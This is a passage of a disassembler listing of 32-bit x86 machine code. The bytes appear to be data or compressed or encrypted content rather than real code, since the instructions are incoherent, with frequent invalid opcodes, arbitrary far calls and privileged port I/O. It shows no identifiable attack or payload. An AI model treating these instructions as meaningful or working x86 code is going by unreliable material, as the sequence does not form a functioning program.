  42e625:	or     cl,BYTE PTR [esi+ecx*1]
  42e628:	(bad)  
  42e629:	cmp    ebx,esi
  42e62b:	cmp    dl,0xce
  42e62e:	sbb    edi,DWORD PTR [ebx-0x55]
  42e631:	(bad)  
  42e632:	call   0xf315:0xb6e44436
  42e639:	or     DWORD PTR [ecx+0x1a3eda9c],esi
  42e63f:	or     edx,edx
  42e641:	xor    edx,ebx
  42e643:	enter  0x227c,0x9b
  42e647:	mov    bl,bl
  42e649:	dec    eax
  42e64a:	shl    DWORD PTR [edi+0x10],0xc3
  42e64e:	dec    edx
  42e64f:	repnz inc eax
  42e651:	or     al,BYTE PTR ds:0xfa141fb9
  42e657:	arpl   si,dx
  42e659:	fdiv   DWORD PTR [edx-0xb]
  42e65c:	inc    edx
  42e65d:	cli    
  42e65e:	call   0x5a07:0x1ffd6d67
  42e665:	mov    dh,0x2f
  42e667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e668:	push   es
  42e669:	xchg   ebp,eax
  42e66a:	sahf   
  42e66b:	push   cs
  42e66c:	aam    0xdd
  42e66e:	stc    
  42e66f:	mov    ch,0xc5
  42e671:	pop    ebx
  42e672:	call   0xbce4:0x9bf54597
  42e679:	cdq    
  42e67a:	xchg   ebp,eax
  42e67b:	test   al,0x99
  42e67d:	pop    edi
  42e67e:	add    DWORD PTR [ecx-0x4596016f],ebx
  42e684:	add    bh,BYTE PTR [ebx-0x5b]
  42e687:	mov    ds:0xfa8f73ac,eax
  42e68c:	jb     0x42e6d7
  42e68e:	sub    BYTE PTR [ecx-0x26],dh
  42e691:	inc    edx
  42e692:	pop    ebp
  42e693:	scas   al,BYTE PTR es:[edi]
  42e694:	rcr    DWORD PTR [eax],0x37
  42e697:	retf   
  42e698:	jae    0x42e6f5
  42e69a:	mov    cl,0x4f
  42e69c:	pop    esp
  42e69d:	xor    al,0xc2
  42e69f:	push   cs
  42e6a0:	in     al,0xa
  42e6a2:	ds fadd st,st(1)
  42e6a5:	push   eax
  42e6a6:	pop    ebx
  42e6a7:	fldenv [edx-0x41]
  42e6aa:	adc    BYTE PTR [ecx-0x2d2ba23b],ch
  42e6b0:	mov    ch,0xe7
  42e6b2:	jo     0x42e6cb
  42e6b4:	jne    0x42e661
  42e6b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6b7:	(bad)  
  42e6b8:	mov    dl,0x99
  42e6ba:	cmc    
  42e6bb:	inc    edx
  42e6bc:	add    al,0xdb
  42e6be:	cdq    
  42e6bf:	sbb    al,0x6b
  42e6c1:	or     eax,DWORD PTR [edi-0x391cb63c]
  42e6c7:	xor    ah,BYTE PTR [ebp+0x5f609a03]
  42e6cd:	aam    0x5f
  42e6cf:	or     DWORD PTR [edi],ecx
  42e6d1:	sub    bl,BYTE PTR [ebx-0x59]
  42e6d4:	(bad)  
  42e6d5:	stos   DWORD PTR es:[edi],eax
  42e6d6:	int    0x6b
  42e6d8:	int    0x1f
  42e6da:	xlat   BYTE PTR ds:[ebx]
  42e6db:	in     eax,dx
  42e6dc:	mov    ch,0xb4
  42e6de:	pusha  
  42e6df:	cmp    bl,BYTE PTR [ebp+0x71757aee]
  42e6e5:	sub    al,0x8c
  42e6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6e8:	(bad)  
  42e6e9:	aam    0xf2
  42e6eb:	popa   
  42e6ec:	sbb    bh,BYTE PTR [edx-0x5886fd26]
  42e6f2:	call   0xa4c:0xcd0f89ea
  42e6f9:	fadd   DWORD PTR [edi+eiz*4]
  42e6fc:	enter  0xa456,0x24
  42e700:	stos   BYTE PTR es:[edi],al
  42e701:	mov    ebx,0xf4b218d1
  42e706:	cmp    ecx,DWORD PTR [ecx]
  42e708:	fwait
  42e709:	mov    bh,0x88
  42e70b:	dec    ebp
  42e70c:	cmp    eax,0x7c01c505
  42e711:	sbb    DWORD PTR es:[ecx-0x11adfd14],edx
  42e718:	sbb    BYTE PTR [eax-0x1271ec66],bl
  42e71e:	xor    esi,DWORD PTR [esi+edi*2+0x4e]
  42e722:	aad    0xa0
  42e724:	ficom  DWORD PTR [eax-0x744bb548]
  42e72a:	mov    ds:0x9a47e5bf,eax
  42e72f:	(bad)  
  42e730:	xor    ch,bl
  42e732:	imul   edx,ebx,0x11
  42e735:	(bad)  
  42e736:	jle    0x42e6df
  42e738:	add    BYTE PTR [ecx-0x1f7af344],al
  42e73e:	adc    ah,bl
  42e740:	mov    dl,0x52
  42e742:	es fs cmp al,0xf0
  42e746:	xchg   ebx,eax
  42e747:	in     al,dx
  42e748:	leave  
  42e749:	pop    ss
  42e74a:	iret   
  42e74b:	add    eax,0xa74ad42a
  42e750:	(bad)  
  42e751:	cmp    dh,BYTE PTR [edi-0x65c6350b]
  42e757:	fwait
  42e758:	addr16 pop ds
  42e75a:	and    ecx,DWORD PTR [ebx-0x580e716b]
  42e760:	fistp  QWORD PTR [edi-0x751e5d54]
  42e766:	stc    
  42e767:	inc    ecx
  42e768:	lods   eax,DWORD PTR ds:[esi]
  42e769:	cwde   
  42e76a:	dec    eax
  42e76b:	or     BYTE PTR [ecx-0x74],dh
  42e76e:	inc    ecx
  42e76f:	idiv   dh
  42e771:	ret    
  42e772:	cmp    edx,DWORD PTR [eax+ebx*2+0x16]
  42e776:	jmp    0x42e7cd
  42e778:	mov    ch,0x84
  42e77a:	clc    
  42e77b:	in     eax,dx
  42e77c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e77e:	jno    0x42e70d
  42e780:	jno    0x42e7d0
  42e782:	jecxz  0x42e7d3
  42e784:	mov    dl,0xc0
  42e786:	hlt    
  42e787:	jno    0x42e725
  42e789:	or     eax,0x805fbaa
  42e78e:	push   ds
  42e78f:	push   edx
  42e790:	call   0x32f6aa34
  42e795:	adc    DWORD PTR [ecx-0x65263081],edx
  42e79b:	jb     0x42e764
  42e79d:	or     dh,BYTE PTR gs:[ecx]
  42e7a0:	jno    0x42e7de
  42e7a2:	mov    DWORD PTR [edi-0x63fca6d2],esp
  42e7a8:	or     al,ch
  42e7aa:	push   esp
  42e7ab:	cmp    BYTE PTR [edx+0x3dafa6a3],dh
  42e7b1:	adc    ecx,DWORD PTR [edi-0x1f]
  42e7b4:	mov    ds:0x95d0080c,eax
  42e7b9:	in     eax,0x22
  42e7bb:	inc    edi
  42e7bc:	aam    0xb1
  42e7be:	mov    ds:0xb805bc6c,al
  42e7c3:	retf   
  42e7c4:	dec    ecx
  42e7c5:	jmp    0x42e836
  42e7c7:	push   edi
  42e7c8:	test   DWORD PTR [ebp+0x557ea7aa],ebp
  42e7ce:	in     al,0xf7
  42e7d0:	pop    ss
  42e7d1:	and    bl,BYTE PTR [ebx-0x26594d96]
  42e7d7:	sbb    ah,ah
  42e7d9:	sbb    DWORD PTR [eax+0x270be7e7],eax
  42e7df:	fadd   DWORD PTR ds:0xd8161936
  42e7e5:	add    ebx,DWORD PTR [edx-0x3c182280]
  42e7eb:	mov    ds:0xa798e3d9,al
  42e7f0:	inc    esi
  42e7f1:	fidiv  WORD PTR [eax+eiz*4]
  42e7f4:	ins    DWORD PTR es:[edi],dx
  42e7f5:	clc    
  42e7f6:	push   esi
  42e7f7:	nop
  42e7f8:	mov    dl,0x4c
  42e7fa:	int3   
  42e7fb:	xor    eax,0x41b47e89
  42e800:	sbb    DWORD PTR [ebx],ecx
  42e802:	stc    
  42e803:	scas   al,BYTE PTR es:[edi]
  42e804:	idiv   ebx
  42e806:	push   ecx
  42e807:	fbld   TBYTE PTR [edx-0x26]
  42e80a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e80b:	adc    edx,eax
  42e80d:	mov    ebx,DWORD PTR [ebp-0x5ab8bab4]
  42e813:	dec    edx
  42e814:	ret    
  42e815:	or     ecx,DWORD PTR [esp+edi*4+0x24]
  42e819:	test   DWORD PTR [ebx-0x6501652d],0x608f9507
  42e823:	mov    DWORD PTR [ecx-0x755806d7],edi
  42e829:	adc    eax,ebx
  42e82b:	mov    WORD PTR [esp+eiz*2],ss
  42e82e:	sub    cl,BYTE PTR [edx]
  42e830:	mov    dl,0x32
  42e832:	jbe    0x42e85c
  42e834:	stc    
  42e835:	(bad)  
  42e837:	adc    BYTE PTR [ebx+ecx*1-0x4a],dl
  42e83b:	aaa    
  42e83c:	clc    
  42e83d:	push   0xffffffba
  42e83f:	xor    bh,bh
  42e841:	rcr    BYTE PTR [edx-0x4e0ed3d6],0x4
  42e848:	jne    0x42e7eb
  42e84a:	mov    ds:0xeb9e2ba4,al
  42e84f:	imul   ebp,DWORD PTR [eax],0xffffff8e
  42e852:	jge    0x42e8ab
  42e854:	inc    eax
  42e855:	xchg   edi,eax
  42e856:	es jg  0x42e80b
  42e859:	mov    cl,0xbd
  42e85b:	dec    esi
  42e85c:	ins    DWORD PTR es:[edi],dx
  42e85d:	push   0x8ad8aa7
  42e862:	test   ah,cl
  42e864:	cmp    al,0x4a
  42e866:	ja     0x42e8cf
  42e868:	xor    ecx,DWORD PTR [ebp+ecx*4-0x65472d91]
  42e86f:	repz fwait
  42e871:	mov    edx,0xaafe1da7
  42e876:	mov    eax,ds:0x396292a7
  42e87b:	cmovl  esi,ebx
  42e87e:	std    
  42e87f:	dec    eax
  42e880:	mov    esp,0xb36ba077
  42e885:	aam    0x9a
  42e887:	add    DWORD PTR [esi-0x43f2cedb],ebp
  42e88d:	or     eax,ebx
  42e88f:	xor    esp,DWORD PTR [edi]
  42e891:	in     eax,0xbf
  42e893:	aad    0xff
  42e895:	into   
  42e896:	sahf   
  42e897:	mov    eax,cs:0x7230c84d
  42e89d:	fild   QWORD PTR [ecx-0x7f]
  42e8a0:	push   edi
  42e8a1:	sbb    eax,ebx
  42e8a3:	stc    
  42e8a4:	add    ecx,DWORD PTR [ebx]
  42e8a6:	jbe    0x42e853
  42e8a8:	cmp    eax,0x52922ca6
  42e8ad:	sub    al,0x9a
  42e8af:	adc    al,0x71
  42e8b1:	sub    bh,BYTE PTR [esi-0x19b552b2]
  42e8b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e8b8:	test   al,0xf5
  42e8ba:	mov    BYTE PTR [edx+0x1d1284ec],bl
  42e8c0:	jecxz  0x42e8fe
  42e8c2:	call   0x3486:0x4df629f5
  42e8c9:	cmp    ebp,ecx
  42e8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e8cc:	rol    BYTE PTR [ecx],0x6c
  42e8cf:	retf   
  42e8d0:	icebp  
  42e8d1:	push   ds
  42e8d2:	sub    bl,BYTE PTR [edx-0x2d]
  42e8d5:	repz add DWORD PTR [ecx-0x52],0xb2183b5a
  42e8dd:	scas   al,BYTE PTR es:[edi]
  42e8de:	sub    edi,ebp
  42e8e0:	sbb    ch,BYTE PTR [edi+0x7a]
  42e8e3:	xlat   BYTE PTR ds:[ebx]
  42e8e4:	out    0xb,eax
  42e8e6:	(bad)  
  42e8e7:	mov    cl,0xe6
  42e8e9:	sub    DWORD PTR [edi],ebp
  42e8eb:	add    DWORD PTR [ebx],eax
  42e8ed:	and    BYTE PTR [ebx+0x6a4f1344],bl
  42e8f3:	jns    0x42e93f
  42e8f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e8f6:	jb     0x42e93e
  42e8f8:	into   
  42e8f9:	imul   esp
  42e8fb:	scas   al,BYTE PTR es:[edi]
  42e8fc:	adc    esi,esp
  42e8fe:	sbb    dl,BYTE PTR [edx+esi*4+0x14]
  42e902:	lahf   
  42e903:	loopne 0x42e96f
  42e905:	adc    BYTE PTR [ecx+0x165eab33],bl
  42e90b:	das    
  42e90c:	(bad)  
  42e90d:	repz cmp eax,0x990b968c
  42e913:	inc    ebp
  42e914:	jno    0x42e8f9
  42e916:	xchg   BYTE PTR [edx-0x7d],dl
  42e919:	and    BYTE PTR [edx+0x6a],0xb5
  42e91d:	push   0xfc3f191a
  42e922:	sbb    bh,BYTE PTR ds:0xa7bc5995
  42e928:	lahf   
  42e929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e92a:	out    0x7f,al
  42e92c:	sub    eax,0x96ea4085
  42e931:	imul   ebx,DWORD PTR [edx],0xffffffb1
  42e934:	mov    dl,0xe2
  42e936:	lock jo 0x42e935
  42e939:	adc    BYTE PTR [eax+0x436616a7],ch
  42e93f:	aaa    
  42e940:	fs jl  0x42e99c
  42e943:	sub    BYTE PTR [edi+ebx*2+0x6b8a403b],bh
  42e94a:	push   ds
  42e94b:	dec    ecx
  42e94c:	out    dx,al
  42e94d:	or     al,ah
  42e94f:	mov    ebx,ebp
  42e951:	imul   esi,DWORD PTR [edi+eiz*4],0x27
  42e955:	push   ecx
  42e956:	push   ebp
  42e957:	leave  
  42e958:	cmp    BYTE PTR [ebx-0xe056d66],0xe
  42e95f:	in     eax,0x30
  42e961:	call   0xa3da:0x7947a7a4
  42e968:	xchg   edi,eax
  42e969:	xlat   BYTE PTR ds:[ebx]
  42e96a:	add    eax,0x11e2b1a8
  42e96f:	in     al,dx
  42e970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e971:	sbb    ebp,DWORD PTR [esi+0xf]
  42e974:	mov    ds,WORD PTR [eax-0x14]
  42e977:	lahf   
  42e978:	pop    ecx
  42e979:	mov    ds:0xc0556a9b,eax
  42e97e:	scas   eax,DWORD PTR es:[edi]
  42e97f:	xchg   edi,eax
  42e980:	or     eax,0xb95867cf
  42e985:	daa    
  42e986:	and    DWORD PTR [ecx+edi*8+0x3dfc9adc],edi
  42e98d:	fwait
  42e98e:	xchg   esp,eax
  42e98f:	sahf   
  42e990:	dec    eax
  42e991:	scas   eax,DWORD PTR es:[edi]
  42e992:	mov    ds:0x88f63266,eax
  42e997:	adc    al,0x10
  42e999:	into   
  42e99a:	call   0x23de:0x415c9794
  42e9a1:	xor    esi,DWORD PTR [ecx]
  42e9a3:	div    DWORD PTR [edx]
  42e9a5:	add    al,BYTE PTR [eax+edx*1]
  42e9a8:	jnp    0x42e9ae
  42e9aa:	sub    BYTE PTR ds:0xbc9ad14c,dh
  42e9b0:	adc    BYTE PTR [eax+0x3ab63d6e],cl
  42e9b6:	push   ds
  42e9b7:	inc    ebp
  42e9b8:	xchg   ecx,eax
  42e9b9:	cmovle edi,DWORD PTR [ebx+ebx*8]
  42e9bd:	sub    eax,0x61ae67c3
  42e9c2:	xchg   edi,eax
  42e9c3:	fwait
  42e9c4:	mov    bl,0x85
  42e9c6:	or     DWORD PTR [eax+0x6b],0x6604195c
  42e9cd:	push   ebx
  42e9ce:	and    DWORD PTR [edi-0x2295eb50],esp
  42e9d4:	dec    ebp
  42e9d5:	mov    DWORD PTR [ecx-0x2a],ebp
  42e9d8:	mov    DWORD PTR [edx+0x4fb5273a],ecx
  42e9de:	rcl    dl,cl
  42e9e0:	mov    edx,0xd1a7d932
  42e9e5:	cmp    DWORD PTR [ecx-0x4],0x61
  42e9e9:	addr16 push eax
  42e9eb:	pop    es
  42e9ec:	mov    dl,0xcc
  42e9ee:	mov    ecx,0x8be9bfc6
  42e9f3:	push   edi
  42e9f4:	and    bl,cl
  42e9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9f7:	in     al,dx
  42e9f8:	lods   eax,DWORD PTR ds:[esi]
  42e9f9:	pop    es
  42e9fa:	xchg   ecx,esi
  42e9fc:	mov    bl,0x6e
  42e9fe:	push   ebp
  42e9ff:	push   edx
  42ea00:	in     eax,dx
  42ea01:	test   eax,0xd0565e09
  42ea06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea08:	mov    ds:0x9ff2bf09,al
  42ea0d:	add    DWORD PTR [edi],ebx
  42ea0f:	fdiv   QWORD PTR [ebp+0x2497fc65]
  42ea15:	mov    ebp,0xebf23828
  42ea1a:	pushf  
  42ea1b:	cmp    eax,0xa0c77605
  42ea20:	cmp    al,0x99
  42ea22:	rcl    BYTE PTR [esi+0x9da748d],1
  42ea28:	das    
  42ea29:	clc    
  42ea2a:	outs   dx,BYTE PTR ds:[esi]
  42ea2b:	dec    edi
  42ea2c:	mov    dl,0xeb
  42ea2e:	jmp    0x42ea34
  42ea30:	mov    ch,0x4b
  42ea32:	push   ds
  42ea33:	aas    
  42ea34:	sub    eax,0xa713dd0b
  42ea39:	je     0x42ea45
  42ea3b:	dec    DWORD PTR [edi]
  42ea3d:	jnp    0x42e9d9
  42ea3f:	pop    esi
  42ea40:	in     al,0xec
  42ea42:	inc    eax
  42ea43:	out    dx,al
  42ea44:	mov    ebp,0x66a7468d
  42ea49:	sbb    al,0xf2
  42ea4b:	xor    BYTE PTR [ebx-0x4d20eff8],bh
  42ea51:	inc    esp
  42ea52:	sbb    al,BYTE PTR ss:[ecx-0x13]
  42ea56:	cmp    eax,0x3f0b4f24
  42ea5b:	mov    eax,ds:0x930932e
  42ea60:	mov    bh,0xc5
  42ea62:	call   0x8fbd:0xab5352c0
  42ea69:	retf   
  42ea6a:	rol    DWORD PTR [edi+0x70],cl
  42ea6d:	or     dl,BYTE PTR [edx+0x61224fe5]
  42ea73:	pop    esi
  42ea74:	jg     0x42ea3d
  42ea76:	xchg   BYTE PTR [esi-0x4f],cl
  42ea79:	gs (bad) 
  42ea7b:	jae    0x42eaf3
  42ea7d:	rol    DWORD PTR [esi],0x53
  42ea80:	xor    eax,0xeba7c553
  42ea85:	mov    dh,0xa8
  42ea87:	sbb    BYTE PTR [edx+0x7f],bh
  42ea8a:	xchg   esp,eax
  42ea8b:	out    dx,eax
  42ea8c:	add    DWORD PTR [ebp-0x1a8c0568],0x6bf2250d
  42ea96:	cmp    al,0x5a
  42ea98:	mov    ebp,0x70c813d9
  42ea9d:	jmp    0x4b63d228
  42eaa2:	ins    BYTE PTR es:[edi],dx
  42eaa3:	ja     0x42eaeb
  42eaa5:	or     eax,eax
  42eaa7:	adc    eax,0xa8c92818
  42eaac:	test   eax,0x707e9ae1
  42eab1:	xor    al,0xcd
  42eab3:	sar    esp,0x23
  42eab6:	inc    eax
  42eab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eab8:	xchg   esp,eax
  42eab9:	or     ah,ah
  42eabb:	pushf  
  42eabc:	lods   eax,DWORD PTR ds:[esi]
  42eabd:	dec    esp
  42eabe:	(bad)  
  42eac0:	xchg   ebp,eax
  42eac1:	push   0x140ed9c9
  42eac6:	daa    
  42eac7:	addr16 ret 
  42eac9:	test   DWORD PTR [esi+0x9],edi
  42eacc:	adc    ebp,DWORD PTR ds:0xb9b2b622
  42ead2:	xchg   edi,eax
  42ead3:	cmp    dl,BYTE PTR [eax-0x757529b4]
  42ead9:	or     ecx,DWORD PTR [edi+0x621f531c]
  42eadf:	dec    esi
  42eae0:	push   edx
  42eae1:	mov    bl,0xa
  42eae3:	pop    esp
  42eae4:	mov    dl,0x87
  42eae6:	xor    ecx,esi
  42eae8:	nop
  42eae9:	mov    al,ds:0xb01c923
  42eaee:	inc    ebp
  42eaef:	daa    
  42eaf0:	shl    DWORD PTR [esi+0x21],1
  42eaf3:	sbb    esi,DWORD PTR [ebp+0x45]
  42eaf6:	call   0x6553:0xfb3eb984
  42eafd:	mov    esp,0x3ad0a4b7
  42eb02:	outs   dx,DWORD PTR ds:[esi]
  42eb03:	xchg   edi,eax
  42eb04:	jge    0x42eaea
  42eb06:	jb     0x42eac0
  42eb08:	cld    
  42eb09:	ret    0xff85
  42eb0c:	inc    esp
  42eb0d:	xchg   edx,eax
  42eb0e:	inc    esp
  42eb0f:	mov    ch,0x4b
  42eb11:	mov    edx,DWORD PTR [edi]
  42eb13:	jecxz  0x42eb77
  42eb15:	mov    ah,0x9d
  42eb17:	inc    ecx
  42eb18:	test   al,0x75
  42eb1a:	scas   eax,DWORD PTR es:[edi]
  42eb1b:	push   edi
  42eb1c:	add    ecx,DWORD PTR [ebx]
  42eb1e:	mov    ah,0x4
  42eb20:	sub    ebp,eax
  42eb22:	xchg   edx,eax
  42eb23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb24:	test   eax,0x88ad96af
  42eb29:	dec    edx
  42eb2a:	imul   edi,DWORD PTR [edi],0x70
  42eb2d:	push   cs
  42eb2e:	dec    ecx
  42eb2f:	scas   al,BYTE PTR es:[edi]
  42eb30:	inc    eax
  42eb31:	pop    ebx
  42eb32:	adc    eax,0x5d517a7
  42eb37:	xchg   ebx,eax
  42eb38:	dec    esi
  42eb39:	repnz call 0x6ea4:0xb8799602
  42eb41:	je     0x42eb1d
  42eb43:	fucom  st(0)
  42eb45:	or     edx,DWORD PTR [esi-0x7b88743f]
  42eb4b:	xor    cl,ch
  42eb4d:	mov    edx,0xc2814599
  42eb52:	xchg   ecx,eax
  42eb53:	in     al,0x84
  42eb55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb56:	jnp    0x42eb5f
  42eb58:	mov    al,BYTE PTR [ebx+ebp*2]
  42eb5b:	daa    
  42eb5c:	push   0xffffffb4
  42eb5e:	inc    ecx
  42eb5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb60:	or     al,BYTE PTR [edx]
  42eb62:	dec    edx
  42eb63:	mov    al,BYTE PTR [ecx]
  42eb65:	dec    edx
  42eb66:	mov    ecx,DWORD PTR cs:[ebx+0x23330ccd]
  42eb6d:	mov    cl,0x8
  42eb6f:	mov    al,ds:0xddaa4147
  42eb74:	ret    0x4dac
  42eb77:	out    dx,al
  42eb78:	jo     0x42eb85
  42eb7a:	and    ebp,edi
  42eb7c:	(bad)  
  42eb7d:	cwde   
  42eb7e:	mov    ah,BYTE PTR [eax-0x22]
  42eb81:	sar    BYTE PTR [esi+0x1],cl
  42eb84:	mov    dl,0x21
  42eb86:	nop
  42eb87:	and    al,0xb5
  42eb89:	in     al,0x35
  42eb8b:	scas   eax,DWORD PTR es:[edi]
  42eb8c:	add    DWORD PTR [edi-0x43],eax
  42eb8f:	and    BYTE PTR [edx+0x4c71edde],dh
  42eb95:	call   DWORD PTR [ebx]
  42eb97:	add    eax,0x5d488cb2
  42eb9c:	inc    eax
  42eb9d:	aad    0xca
  42eb9f:	outs   dx,BYTE PTR es:[esi]
  42eba1:	push   cs
  42eba2:	mov    ecx,0xb302e7a4
  42eba7:	daa    
  42eba8:	mov    ebx,0xb5e0e584
  42ebad:	(bad)  
  42ebae:	push   0x5a9dc503
  42ebb3:	add    bl,bl
  42ebb5:	and    BYTE PTR [ebp-0x59],0x99
  42ebb9:	ficom  DWORD PTR [eax+0x6ce1082f]
  42ebbf:	push   0xdc35bb5
  42ebc4:	stos   DWORD PTR es:[edi],eax
  42ebc5:	jbe    0x42ebd1
  42ebc7:	arpl   bp,bp
  42ebc9:	jg     0x42ec47
  42ebcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ebcc:	cmp    BYTE PTR [edi],ch
  42ebce:	mov    ds:0xfb5653e9,al
  42ebd3:	imul   ecx,eax,0x9b2891b4
  42ebd9:	push   edi
  42ebda:	test   BYTE PTR [edi],ah
  42ebdc:	sbb    al,0x46
  42ebde:	xor    DWORD PTR [ebx-0x6c],edi
  42ebe1:	or     al,0x6d
  42ebe3:	sbb    DWORD PTR [ebp+0x51],ebx
  42ebe6:	cmp    al,0x7
  42ebe8:	loope  0x42eb94
  42ebea:	ss jmp 0x42eb9f
  42ebed:	int3   
  42ebee:	push   ecx
  42ebef:	sti    
  42ebf0:	push   ebx
  42ebf1:	jle    0x42eba8
  42ebf3:	push   0xffffffb8
  42ebf5:	or     BYTE PTR [ecx+0x71ceb3e9],ch
  42ebfb:	gs dec edx
  42ebfd:	inc    ecx
  42ebfe:	dec    ecx
  42ebff:	test   DWORD PTR [ebp-0x676f31e4],edi
  42ec05:	test   eax,0x4bec0c09
  42ec0a:	fnsave [edx+0x53ed05e1]
  42ec10:	or     edi,DWORD PTR [edx-0x26]
  42ec13:	repnz int 0x49
  42ec16:	pop    ss
  42ec17:	push   cs
  42ec18:	mov    dl,0x64
  42ec1a:	sbb    ebx,DWORD PTR [edx+ebp*1]
  42ec1d:	push   edi
  42ec1e:	mov    al,ds:0x4b77770c
  42ec23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec24:	scas   eax,DWORD PTR es:[edi]
  42ec25:	repz lahf 
  42ec27:	loop   0x42ebf7
  42ec29:	add    al,0xac
  42ec2b:	sub    dh,BYTE PTR [edx+0x7341d12a]
  42ec31:	scas   al,BYTE PTR es:[edi]
  42ec32:	push   edx
  42ec33:	fstp   DWORD PTR [ebp+0x76]
  42ec36:	ret    
  42ec37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec38:	int    0xe0
  42ec3a:	jb     0x42ec80
  42ec3c:	and    al,BYTE PTR [edx+edi*8+0x167db2d4]
  42ec43:	add    ebp,DWORD PTR [eax+0x15]
  42ec46:	stos   BYTE PTR es:[edi],al
  42ec47:	(bad)  
  42ec49:	adc    eax,0x8bebefe1
  42ec4e:	push   ds
  42ec4f:	pusha  
  42ec50:	mov    esp,0xb1aa24de
  42ec55:	bswap  edi
  42ec57:	mov    dh,0xd3
  42ec59:	jns    0x42ecbb
  42ec5b:	jnp    0x42eccf
  42ec5d:	outs   dx,DWORD PTR ds:[esi]
  42ec5e:	ja     0x42eccb
  42ec60:	pop    ebp
  42ec61:	or     edx,DWORD PTR [ebx]
  42ec63:	xchg   esi,eax
  42ec64:	aas    
  42ec65:	pop    ebp
  42ec66:	in     eax,dx
  42ec67:	ret    
  42ec68:	(bad)  
  42ec69:	and    DWORD PTR [ebp+0x768a1ff3],esp
  42ec6f:	hlt    
  42ec70:	inc    esi
  42ec71:	jne    0x42ec97
  42ec73:	arpl   WORD PTR [esi-0x56],di
  42ec76:	jp     0x42ec11
  42ec78:	mov    dh,0x44
  42ec7a:	call   0xe53d:0x31ad476b
  42ec81:	les    ebx,FWORD PTR [edx-0x1fdd1579]
  42ec87:	mov    ah,bl
  42ec89:	push   ecx
  42ec8a:	fsub   DWORD PTR [edi+0x5127300b]
  42ec90:	xor    eax,0xbd8fecc0
  42ec95:	addr16 push es
  42ec97:	push   edx
  42ec98:	cmp    DWORD PTR [ebx-0x5e88624],ebp
  42ec9e:	test   eax,0xcb355aa7
  42eca3:	ja     0x42ec82
  42eca5:	ss ins DWORD PTR es:[edi],dx
  42eca7:	rol    ebx,cl
  42eca9:	xchg   ebx,eax
  42ecaa:	call   0x42a3:0x8e6521ca
  42ecb1:	add    DWORD PTR [ebp-0x46],esi
  42ecb4:	push   0x2fe6a9ac
  42ecb9:	pop    es
  42ecba:	popa   
  42ecbb:	and    al,0xea
  42ecbd:	call   FWORD PTR [edi]
  42ecbf:	mov    ah,0x8e
  42ecc1:	xchg   edx,eax
  42ecc2:	bound  esp,QWORD PTR [edi-0x61cbc625]
  42ecc8:	mov    BYTE PTR [esi-0x57d4f8c2],bh
  42ecce:	and    al,0xbb
  42ecd0:	sbb    BYTE PTR [ebp-0x4d],al
  42ecd3:	addr16 pop edi
  42ecd5:	test   DWORD PTR [edi],0xe754a73b
  42ecdb:	and    eax,0x68da7dad
  42ece0:	xor    dl,BYTE PTR [ecx+0x9]
  42ece3:	(bad)  
  42ece4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ece5:	add    eax,0x9554a734
  42ecea:	xchg   ebx,eax
  42eceb:	mov    ebp,0xb1e7634a
  42ecf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecf1:	xor    ch,BYTE PTR [ecx-0x48394d33]
  42ecf7:	das    
  42ecf8:	daa    
  42ecf9:	and    ah,cl
  42ecfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ecfc:	fld    DWORD PTR [esi+0x37]
  42ecff:	mov    ebp,0xc97d100e
  42ed04:	mov    dl,0x45
  42ed06:	add    BYTE PTR [eax],ah
  42ed08:	jno    0x42ece4
  42ed0a:	fadd   st(1),st
  42ed0c:	not    BYTE PTR ds:0xcbf181bd
  42ed12:	jp     0x42ecb3
  42ed14:	lods   al,BYTE PTR ds:[esi]
  42ed15:	int    0x72
  42ed17:	push   edx
  42ed18:	mov    dl,0x58
  42ed1a:	lahf   
  42ed1b:	sub    DWORD PTR [edx+ebx*2+0x70],ebx
  42ed1f:	cmp    DWORD PTR [edi-0x5a754ecd],0xffffffca
  42ed26:	call   0xb3e59ace
  42ed2b:	daa    
  42ed2c:	adc    DWORD PTR [esi],ebp
  42ed2e:	pop    ss
  42ed2f:	es mov dl,0x4f
  42ed32:	xchg   edi,eax
  42ed33:	cld    
  42ed34:	pop    edx
  42ed35:	mov    esi,0x8e8c8bb
  42ed3a:	sub    eax,0x8395a798
  42ed3f:	mov    ebx,0x94928c72
  42ed44:	mov    DWORD PTR [ebx+0x23332773],ecx
  42ed4a:	leave  
  42ed4b:	adc    al,0x55
  42ed4d:	int    0xcb
  42ed4f:	mov    ds:0x29de1223,al
  42ed54:	push   es
  42ed55:	mov    esp,DWORD PTR [esi]
  42ed57:	cmp    BYTE PTR ds:0x6f45a314,dl
  42ed5d:	mov    esp,DWORD PTR [ebx+0xb]
  42ed60:	and    esi,edi
  42ed62:	(bad)
  42ed66:	sbb    BYTE PTR [ebp-0x7a],cl
  42ed69:	retf   
  42ed6a:	adc    DWORD PTR [edx+eax*1-0x42bcf21a],ecx
  42ed71:	adc    DWORD PTR [edi],eax
  42ed73:	mov    eax,0x1c098bc9
  42ed78:	pop    ecx
  42ed79:	(bad)  
  42ed7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ed7c:	push   0x9
  42ed7e:	sub    eax,0xce376f07
